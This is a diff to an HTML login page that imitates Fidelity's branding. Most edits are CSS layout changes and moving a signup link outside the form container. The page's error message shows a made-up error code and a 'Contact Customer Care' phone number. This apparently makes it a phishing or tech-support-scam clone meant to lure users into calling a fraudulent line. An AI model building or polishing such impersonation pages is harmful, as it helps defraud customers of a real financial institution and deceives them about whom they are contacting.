@@ -15,6 +15,7 @@
             align-items: center;
             height: 100vh;
             position: relative;
+            flex-direction: column;
         }
 
         .container {
@@ -68,21 +69,18 @@
             background-color: #218838;
         }
 
-        .forgot-password,
-        .signup-link {
+        .forgot-password {
             display: block;
             margin-top: 15px;
             text-align: left;
         }
 
-        .forgot-password a,
-        .signup-link a {
+        .forgot-password a {
             color: black;
             text-decoration: underline;
         }
 
-        .forgot-password a:hover,
-        .signup-link a:hover {
+        .forgot-password a:hover {
             text-decoration: underline;
         }
 
@@ -98,6 +96,21 @@
         }
 
         .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .signup-link {
+            margin-top: 20px;
+            font-size: 14px;
+            text-align: center;
+        }
+
+        .signup-link a {
+            color: black;
+            text-decoration: underline;
+        }
+
+        .signup-link a:hover {
             text-decoration: underline;
         }
 
@@ -137,6 +150,7 @@
     <div class="logo">
         <img src="fidelity-vector-logo-small.png" alt="Fidelity Logo">
     </div>
+    
     <div class="container">
         <h2>Log in</h2>
         <form id="loginForm">
@@ -159,9 +173,11 @@
             </div>
         </form>
     </div>
-         <div class="signup-link">
-            New to Fidelity? <a href="#">Open an account or sign up.</a>
-        </div>
+
+    <!-- Signup link outside the container -->
+    <div class="signup-link">
+        New to Fidelity? <a href="#">Open an account or sign up.</a>
+    </div>
 
     <script>
         // Function to save username to localStorage if "Remember my username" is checked
@@ -189,7 +205,6 @@
         function showErrorMessage() {
             const errorMessage = document.getElementById('error-message');
             errorMessage.innerHTML = 'Error Code : 00X47800 <br> Contact Customer Care : +1-844-499-1812';
-
         }
 
         // Handle form submission
